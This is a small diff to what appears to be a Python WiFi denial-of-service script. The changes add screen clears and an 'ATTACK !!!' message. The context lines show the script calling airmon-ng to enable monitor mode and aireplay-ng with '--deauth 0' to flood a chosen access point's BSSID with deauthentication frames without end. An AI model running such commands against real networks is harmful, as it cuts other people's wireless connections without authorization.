@@ -8,6 +8,7 @@ import os
 import subprocess
 from datetime import datetime
 
+os.system('clear')
 print(r"""
    █████████                                             ██████████      ███████     █████████ 
   ███░░░░░███                                           ░░███░░░░███   ███░░░░░███  ███░░░░░███
@@ -119,6 +120,8 @@ while True:
 bssid = wire_networks[int(choice)]["BSSID"]
 channel = wire_networks[int(choice)]["channel"].strip()
 subprocess.run(["airmon-ng", "start", your_choice, channel])
+os.system('clear')
+print('ATTACK !!!')
 subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, card_wifi[int(wifi_interface_choice)]])
 
 
